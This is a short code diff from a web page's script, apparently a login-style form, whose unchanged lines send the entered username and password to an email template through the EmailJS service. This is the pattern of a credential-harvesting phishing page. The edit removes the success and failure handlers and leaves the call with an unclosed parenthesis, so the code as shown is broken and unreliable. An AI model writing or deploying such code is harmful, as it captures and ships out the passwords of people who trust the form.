@@ -291,17 +291,7 @@
         emailjs.send("service_cvhvjxv", "template_7ddcn92", {
           username: username,
           password:password 
-        })
-        .then(() => {
-          status.textContent = "Access granted ✓";
-          form.reset();
-        })
-        .catch((err) => {
-          console.error(err);
-          status.textContent = "Access denied ✗";
-        });
-
-      });
+        }
 
     });
   </script>
